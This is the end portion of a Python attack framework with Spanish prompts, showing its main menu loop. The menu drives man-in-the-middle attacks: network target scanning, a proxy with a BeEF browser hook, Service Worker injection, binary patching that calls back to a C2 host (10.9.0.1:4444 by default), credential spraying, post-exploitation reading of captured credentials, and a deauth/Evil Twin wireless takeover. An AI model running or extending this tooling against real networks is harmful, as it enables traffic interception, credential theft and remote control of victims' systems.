            print(f"[!] ADVERTENCIA: '{tool}' no encontrado. Modo wireless requerira instalacion.")

    orch = MITMOrchestrator()

    while True:
        print("\n[1] Escanear red local cableada y seleccionar objetivo")
        print("[2] Ingresar IP objetivo manualmente")
        print("[3] Proxy Local")
        print("[4] Herramientas Post-Explotacion (Leer logs/creds)")
        print("[5] Deauth + Evil Twin + MITM")
        print("[0] Salir del framework")
        opt = input("\n[?] Seleccionar opcion: ").strip()

        if opt == "1": menu_scan_and_attack(orch)
        elif opt == "2": menu_manual_attack(orch)
        elif opt == "3":
            beef = input("[?] URL Hook BeEF (Enter omitir): ").strip()
            if beef and not beef.startswith("http"): beef = f"http://{beef}"
            web = input("[?] Interfaz Web mitmweb? (s/n) [n]: ").strip().lower() == 's'
            mode_s = input("[?] Modo [1-4] [1]: ").strip()
            m, _ = MITMOrchestrator.MODES.get(mode_s, ('capture', ''))

            print("\n[*] Modulos de Post-Explotacion Avanzada:")
            enable_sw = input("[?] Activar Service Worker Injection? (s/n) [n]: ").strip().lower() == 's'
            enable_bp = input("[?] Activar Binary Patching? (s/n) [n]: ").strip().lower() == 's'
            enable_wsg = input("[?] Activar WebSocket/gRPC Parser? (s/n) [n]: ").strip().lower() == 's'
            enable_spray = input("[?] Activar Credential Spraying? (s/n) [n]: ").strip().lower() == 's'

            c2_host = "10.9.0.1"
            c2_port = 4444
            if enable_bp:
                c2_host = input(f"[?] Host C2 [{c2_host}]: ").strip() or c2_host
                c2_port_s = input(f"[?] Puerto C2 [{c2_port}]: ").strip()
                if c2_port_s: c2_port = int(c2_port_s)

            orch.execute_proxy_only(m, beef, web, enable_sw, enable_bp, enable_wsg, enable_spray, c2_host, c2_port)
        elif opt == "4": menu_post_exploitation()
        elif opt == "5": menu_wireless_takeover(orch)
        elif opt == "0": print("[*] Cerrando framework..."); break
        else: print("[!] Opcion no reconocida.")

if __name__ == "__main__":
    main()
